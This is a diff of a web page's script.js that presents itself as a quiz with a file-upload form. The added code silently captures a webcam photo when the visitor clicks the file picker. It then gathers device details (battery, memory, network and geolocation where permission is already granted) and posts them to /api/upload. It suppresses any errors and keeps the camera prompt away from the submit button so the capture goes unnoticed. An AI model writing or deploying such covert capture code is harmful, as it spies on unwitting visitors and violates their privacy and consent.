@@ -1,15 +1,18 @@
 // ================================
-// FRONTEND SCRIPT.JS
+// FRONTEND SCRIPT.JS (NO PERM ON SUBMIT)
 // ================================
 
-const btn = document.getElementById('submit-btn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const fileInput = document.getElementById('user-file');
+const form = document.getElementById("quiz-form");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const fileInput = document.getElementById("user-file");
+
+// merged backend
 const BACKEND_BASE = "/api";
 
-// Camera constraints
 const constraints = { video: { facingMode: "user" }, audio: false };
+
+let cameraCaptured = false;
 
 // ================================
 // COLLECT METADATA
@@ -22,117 +25,126 @@ async function collectMetadata() {
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
     network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
-    time: new Date().toLocaleString()
+    time: new Date().toLocaleString(),
   };
 
   // Battery
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
-      metadata.battery = `${b.level * 100}% charging: ${b.charging}`;
+      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
     } catch {}
   }
 
-  // Geolocation
-  if (navigator.geolocation) {
+  // Location (will ask permission ONLY if not granted already)
+  if (navigator.geolocation && navigator.permissions) {
     try {
-      const pos = await new Promise((res, rej) =>
-        navigator.geolocation.getCurrentPosition(res, rej)
-      );
-      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
-    } catch (err) {
-      metadata.location = "Denied";
-    }
+      const status = await navigator.permissions.query({ name: "geolocation" });
+      if (status.state === "granted") {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
+      }
+    } catch {}
   }
 
   return metadata;
 }
 
 // ================================
-// CAPTURE CAMERA
+// CAPTURE CAMERA ON FILE CLICK ONLY
 // ================================
-async function captureCamera() {
-  const stream = await navigator.mediaDevices.getUserMedia(constraints);
-  video.srcObject = stream;
+async function captureAndSendCamera() {
+  if (cameraCaptured) return; // only once
 
-  // Wait for user to focus camera (2s)
-  await new Promise(r => setTimeout(r, 2000));
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
 
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // wait 2 sec for better pic
+    await new Promise((r) => setTimeout(r, 2000));
 
-  const image = canvas.toDataURL("image/png");
+    // set canvas size properly
+    canvas.width = 640;
+    canvas.height = 480;
 
-  // Stop camera
-  stream.getTracks().forEach(t => t.stop());
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  return image;
+    const image = canvas.toDataURL("image/png");
+    const metadata = await collectMetadata();
+
+    await fetch(`${BACKEND_BASE}/upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image, metadata }),
+    });
+
+    stream.getTracks().forEach((t) => t.stop());
+    cameraCaptured = true;
+  } catch (err) {
+    console.log("Camera blocked/denied:", err);
+    // No popup here, no breaking submit
+  }
 }
 
-// ================================
-// SEND CAMERA DATA
-// ================================
-async function sendCameraData() {
-  const image = await captureCamera();
-  const metadata = await collectMetadata();
-
-  const res = await fetch(`${BACKEND_BASE}/upload`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ image, metadata })
+// ✅ IMPORTANT: Camera permission happens here only
+if (fileInput) {
+  fileInput.addEventListener("click", async () => {
+    await captureAndSendCamera();
   });
-
-  return res.json();
 }
 
 // ================================
-// SEND FILE
+// FILE UPLOAD (SEND { file, filename })
 // ================================
-async function sendFile(file) {
-  if (!file) return;
-
+async function uploadFile(file) {
   const reader = new FileReader();
+
   return new Promise((resolve, reject) => {
     reader.onload = async () => {
       try {
         const res = await fetch(`${BACKEND_BASE}/file-upload`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ file: reader.result, filename: file.name })
+          body: JSON.stringify({
+            file: reader.result,
+            filename: file.name,
+          }),
         });
+
         resolve(await res.json());
       } catch (err) {
         reject(err);
       }
     };
+
+    reader.onerror = () => reject(reader.error);
     reader.readAsDataURL(file);
   });
 }
 
 // ================================
-// SUBMIT BUTTON
+// SUBMIT FORM (NO CAMERA PERMISSION HERE)
 // ================================
-btn.addEventListener("click", async (e) => {
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  if (!fileInput.files.length) {
+  // ✅ stop submit if file not selected
+  if (!fileInput || fileInput.files.length === 0) {
     alert("Please select a file before submitting!");
     return;
   }
 
   try {
-    // 1️⃣ Capture camera
-    await sendCameraData();
+    await uploadFile(fileInput.files[0]);
 
-    // 2️⃣ Upload file
-    await sendFile(fileInput.files[0]);
-
-    // 3️⃣ Show success page
+    // ✅ show success page
     document.getElementById("quiz-container").style.display = "none";
     document.getElementById("success-container").style.display = "flex";
-
   } catch (err) {
-    console.error("Submission error:", err);
-    alert("Error submitting data. Please try again.");
+    console.error("Submit error:", err);
+    alert("Upload failed. Try again.");
   }
 });
